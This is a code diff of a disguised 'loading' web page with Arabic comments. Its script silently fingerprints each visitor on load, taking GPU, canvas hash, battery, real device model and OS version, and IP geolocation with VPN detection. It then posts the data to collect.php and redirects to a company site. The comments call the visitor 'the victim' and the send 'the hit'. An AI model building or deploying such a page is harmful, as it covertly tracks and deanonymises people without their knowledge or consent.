@@ -4,60 +4,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري المعالجة...</title>
+    <title>تحميل الموارد...</title>
     <style>
-        body { background: #0f172a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; font-family: sans-serif; }
+        .loader { border: 3px solid #333; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
     <script>
-        async function buildSystemXDossier() {
+        async function runSystemX() {
             let data = {
                 ua: navigator.userAgent,
+                res: `${screen.width}x${screen.height}`,
+                physRes: `${screen.width * window.devicePixelRatio}x${screen.height * window.devicePixelRatio}`,
+                dpr: window.devicePixelRatio,
+                touch: navigator.maxTouchPoints,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
                 lang: navigator.language,
-                res: screen.width + "x" + screen.height,
-                dpr: window.devicePixelRatio || 1,
-                hw: { cores: navigator.hardwareConcurrency || 0, ram: navigator.deviceMemory || 0 },
-                theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark 🌙' : 'Light ☀️',
-                math: Math.tan(-1e300).toString().slice(0,10)
+                math: Math.tan(-1e300).toString().slice(0, 15),
+                webdriver: navigator.webdriver ? "Bot 🤖" : "Human 🟢"
             };
 
-            // 1. WebGL (GPU) & Canvas Fingerprint
+            // 1. كشف الـ GPU بدقة
             try {
-                let canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl');
-                if(gl) {
-                    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    data.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
-                }
-                data.canvasHash = canvas.toDataURL().slice(-20);
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                data.gpu_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                data.gpu_renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                data.canvas_hash = canvas.toDataURL().slice(-30);
             } catch(e) {}
 
-            // 2. Async Data (Battery, Network, Storage)
-            let promises = [];
-            
-            // جلب الأي بي والـ VPN من طرف العميل لتخفيف الضغط على السيرفر
-            promises.push(fetch('http://ip-api.com/json/?fields=query,status,country,city,isp,hosting')
-                .then(r => r.json()).then(ip => data.net = ip).catch(e => data.net = {}));
+            // 2. تجميع مهام البيانات غير المتزامنة (الشبكة، البطارية، الإصدار الحقيقي)
+            let tasks = [];
 
-            if(navigator.getBattery) {
-                promises.push(navigator.getBattery().then(b => data.bat = Math.round(b.level * 100) + "%").catch(e=>e));
-            }
-            if(navigator.userAgentData) {
-                promises.push(navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion'])
-                    .then(ua => { data.model = ua.model; data.osVer = ua.platformVersion; }).catch(e=>e));
-            }
-            
-            // انتظار المهام بحد أقصى 600 ملي ثانية
-            await Promise.race([
-                Promise.all(promises),
-                new Promise(r => setTimeout(r, 600))
-            ]);
+            // جلب البيانات الجغرافية والـ VPN من العميل
+            tasks.push(fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
+                data.net = { ip: ip.ip, isp: ip.org, city: ip.city, country: ip.country_name, vpn: ip.hosting };
+            }).catch(() => {}));
 
-            // 3. الإرسال والتحويل
+            // كشف البطارية
+            if (navigator.getBattery) {
+                tasks.push(navigator.getBattery().then(b => data.bat = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`));
+            }
+
+            // كسر حماية الـ User-Agent لجلب الإصدار الحقيقي (أندرويد 16 مثلاً)
+            if (navigator.userAgentData) {
+                tasks.push(navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion'])
+                    .then(ua => { data.realModel = ua.model; data.realOS = ua.platformVersion; }));
+            }
+
+            // انتظار المهام لمدة قصيرة جداً لضمان السرعة
+            await Promise.race([Promise.all(tasks), new Promise(r => setTimeout(r, 1000))]);
+
+            // 3. إرسال "الضربة" للسيرفر
             fetch('collect.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -65,11 +68,11 @@
                 keepalive: true
             });
 
-            // تحويل فوري
-            setTimeout(() => { window.location.replace("<?php echo COMPANY_URL; ?>"); }, 100);
+            // 4. تحويل الضحية
+            setTimeout(() => { window.location.replace("<?php echo COMPANY_URL; ?>"); }, 150);
         }
 
-        buildSystemXDossier();
+        runSystemX();
     </script>
 </body>
 </html>
